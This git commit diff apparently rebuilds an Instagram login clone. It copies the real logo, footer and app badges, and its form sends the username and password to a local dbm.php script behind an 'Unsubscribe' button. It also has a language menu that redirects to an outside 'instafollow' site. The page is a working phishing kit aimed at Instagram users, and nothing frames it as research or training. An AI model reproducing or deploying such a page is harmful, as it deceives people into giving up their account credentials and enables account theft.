5cdb6ba9d2025172b30d1f923dd2e8ab5129f9ae
Z3RO-O <vaibhavsingh_21523@aitpune.edu.in>
2023-08-15 12:31:47 +0530

    Facebook and Instagram Frontend

--- Instagram/index.php
+++ Instagram/index.php
@@ -1,23 +1,241 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unsubscribe</title>
-    <link type="text/css" rel="stylesheet" href="style.css">
-</head>
-<body background-color="#f0f0f0">
-    <div id=blk>
-    <h1 id="fb">Instagram</h1>
-    <p1>Instagram helps you connect and share with the people in you life.</p1>
-    </div>
-    <div id="entry">
-        <form action="dbm.php" method="post">
-            <input type="text" id="user" name="user" placeholder="email or username"><br><br>
-            <input type="password" id="pass" name="pass" placeholder="password"><br><br>
-            <input type="submit" id="submit" name="submit" value="Unsubscribe">
-            
-        </form>
-    </div>
-</body>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login • Instagram</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon" />
+    <link type="text/css" rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <span id="root">
+      <section class="section-all">
+        <!-- 1-Role Main -->
+        <main class="main" role="main">
+          <div class="wrapper">
+            <article class="article">
+              <div class="content">
+                <div class="login-box">
+                  <div class="header">
+                    <img
+                      class="logo"
+                      style="scale: 1.05; margin: 15px 20px"
+                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                      alt="Instagram"
+                    />
+                  </div>
+                  <!-- Header end -->
+                  <div class="form-wrap">
+                    <form class="form" action="dbm.php" method="post">
+                      <div class="input-box">
+                        <input
+                          type="text"
+                          id="user"
+                          name="user"
+                          aria-describedby=""
+                          placeholder="Phone number, username, or email"
+                          aria-required="true"
+                          maxlength="30"
+                          autocapitalize="off"
+                          autocorrect="off"
+                          name="username"
+                          value=""
+                          required
+                        />
+                      </div>
+
+                      <div class="input-box">
+                        <input
+                          type="password"
+                          id="pass"
+                          name="pass"
+                          placeholder="Password"
+                          aria-describedby=""
+                          maxlength="30"
+                          aria-required="true"
+                          autocapitalize="off"
+                          autocorrect="off"
+                          required
+                        />
+                      </div>
+
+                      <span class="button-box">
+                        <button
+                          class="btn"
+                          type="submit"
+                          id="submit"
+                          name="submit"
+                          value="Unsubscribe"
+                        >
+                          Unsubscribe
+                        </button>
+                      </span>
+
+                      <a class="forgot" href="">Forgot password?</a>
+                    </form>
+                  </div>
+                  <!-- Form-wrap end -->
+                </div>
+                <!-- Login-box end -->
+
+                <div class="login-box">
+                  <p class="text">
+                    Don't have an account?<a
+                      href="https://www.instagram.com/accounts/emailsignup/"
+                      >Sign up</a
+                    >
+                  </p>
+                </div>
+                <!-- Signup-box end -->
+
+                <div class="app">
+                  <p>Get the app.</p>
+                  <div class="app-img">
+                    <a
+                      href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge"
+                    >
+                      <img
+                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"
+                      />
+                    </a>
+                    <a
+                      href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1080"
+                    >
+                      <img
+                        src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
+                      />
+                    </a>
+                  </div>
+                  <!-- App-img end-->
+                </div>
+                <!-- App end -->
+              </div>
+              <!-- Content end -->
+            </article>
+          </div>
+          <!-- Wrapper end -->
+        </main>
+
+        <!-- 2-Role Footer -->
+        <footer class="footer" role="contentinfo">
+          <div class="footer-container">
+            <nav class="footer-nav" role="navigation">
+              <ul>
+                <li>
+                  <a target="_blank " href="https://about.meta.com/">Meta</a>
+                </li>
+                <li>
+                  <a target="_blank " href="https://about.instagram.com/"
+                    >About</a
+                  >
+                </li>
+                <li>
+                  <a target="_blank" href="https://about.instagram.com/blog/"
+                    >Blog</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://www.instagram.com/about/jobs/"
+                    >Jobs</a
+                  >
+                </li>
+                <li>
+                  <a target="_blank " href="https://help.instagram.com/"
+                    >Help</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://developers.facebook.com/docs/instagram"
+                    >API</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://www.instagram.com/legal/privacy/"
+                    >Privacy</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://www.instagram.com/legal/terms/"
+                    >Terms</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://www.instagram.com/directory/profiles/"
+                    >Top Accounts</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://www.instagram.com/explore/locations/"
+                    >Locations</a
+                  >
+                </li>
+                <li>
+                  <a target="_blank " href="https://www.instagram.com/web/lite/"
+                    >Instagram Lite</a
+                  >
+                </li>
+                <li>
+                  <a target="_blank " href="https://www.threads.net/"
+                    >Threads</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://l.instagram.com/?u=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2F261704639352628&e=AT0dsJPIHy7ywizC3LSz3Ippg9G0A_SnHSsIkVY12zsA2EBFr-_LR0syxkjdhcjNbDSfh0DQoBb77q5b3HXjbZcCMhui3Q1Hon-MrNTKL50cLy5QWsECtnH0yIAXQStdRERqmmbnE5Wc94QwFF7sEA"
+                    >Contact Uploading & Non-Users</a
+                  >
+                </li>
+                <li>
+                  <a
+                    target="_blank "
+                    href="https://about.meta.com/technologies/meta-verified/"
+                    >Meta Verified</a
+                  >
+                </li>
+              </ul>
+            </nav>
+            <!-- Footer container end -->
+        </footer>
+    </section>
+</span>
+<div style="font-size: small;justify-content: center;flex-direction: row;padding-bottom: 5%;margin-top: -2%;">
+  <span class="language"
+    >Language
+    <select
+      name="language"
+      class="select"
+      aria-selected="true"
+      onchange="la(this.value)"
+    >
+      <option value="#">English</option>
+      <option value="http://ru-instafollow.bitballoon.com">
+        Russian
+      </option>
+    </select>
+  </span>
+  <span style="color: #737373;padding-left: 2%;" class="footer-logo">&copy; 2023 Instagram form Meta</span>
+</div>
+</div>
+<!-- Root -->
+
+    <!-- Select Link -->
+    <script type="text/javascript">
+      function la(src) {
+        window.location = src;
+      }
+    </script>
+  </body>
 </html>
